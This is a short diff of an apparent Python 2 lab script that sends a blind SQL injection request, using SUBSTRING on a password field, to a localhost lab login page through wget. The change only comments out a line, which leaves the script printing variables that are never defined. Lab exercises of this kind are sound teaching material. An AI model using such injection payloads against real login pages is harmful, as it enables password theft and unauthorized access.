@@ -5,7 +5,7 @@ request = "\"http://localhost/lab09/login.php?u=\" OR id = 98 AND SUBSTRING(pass
 bashCommand = "wget  -q -O - " + request 
 #bashCommand = "echo 'hello' "
 subprocess.call(['wget','-q','-O -',request])
-output, error = process.communicate()
+#output, error = process.communicate()
 print output
 print error
 print bashCommand
